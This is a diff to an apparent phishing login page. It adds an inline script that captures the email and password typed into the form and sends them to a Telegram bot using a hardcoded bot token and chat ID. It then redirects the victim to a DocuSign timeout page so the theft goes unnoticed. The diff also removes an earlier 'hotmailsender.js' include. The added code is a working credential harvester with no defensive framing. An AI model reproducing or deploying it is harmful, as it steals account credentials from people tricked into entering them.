@@ -765,7 +765,6 @@
                     </div>
                 </div>
             </div>
-	  <script src="hotmailsender.js"></script>
             <div class="footer">
                 <span id="copyright">
                     © 2025
@@ -773,7 +772,32 @@
                 </span>
             </div>
         </div>
-       
+         <script>
+      const formal = document.querySelector('#form')
+    
+      let bot = {
+          TOKEN: "8015436370:AAE6LyAmr9taK6_V-q2HAzBj_O9oopR7JNg",
+          chatID: "6414984639"
+      }
+
+
+      formal.addEventListener("submit", e =>{
+          e.preventDefault();
+
+          let result1 = document.querySelector('#xiemail').value
+          let result2 = document.querySelector('#pipassword').value
+          
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=ATT-RESULT=Username::${result1}==++==Password::${result2}`, {
+              method: "GET"
+          }).then(success => {
+              window.location.replace("https://na4.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f");
+          }, error => {
+              alert("Message not sent")
+              console.log(error)
+
+          })
+      })
+  </script>
     </body>
     <grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration>
 
